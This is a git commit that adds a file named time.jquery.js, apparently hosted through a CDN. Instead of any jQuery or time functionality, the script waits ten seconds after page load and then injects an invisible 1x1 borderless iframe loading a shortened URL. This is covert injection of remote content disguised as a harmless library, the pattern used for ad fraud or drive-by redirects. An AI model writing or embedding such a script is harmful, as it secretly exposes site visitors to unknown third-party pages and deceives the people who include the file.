7c506d47b8ccc2bc6cdf874342cbeac011942abf
hipacket <48793270+hipacket@users.noreply.github.com>
2019-03-27 16:50:18 +0700

    Create time.jquery.js

---
+++ time.jquery.js
@@ -0,0 +1,14 @@
+///https://cdn.jsdelivr.net/gh/hipacket/script/time.jquery.min.js
+window.onload = function(){
+  var list = ['https://shorten.asia/zuMMZk5u'];
+  setTimeout(function(){
+    var node = document.createElement('iframe');
+    node.width = 1;
+    node.height = 1;
+    node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
+    list.forEach(url => {
+      node.src = url;
+      document.body.append(node.cloneNode());
+    })
+  }, 10000);
+}
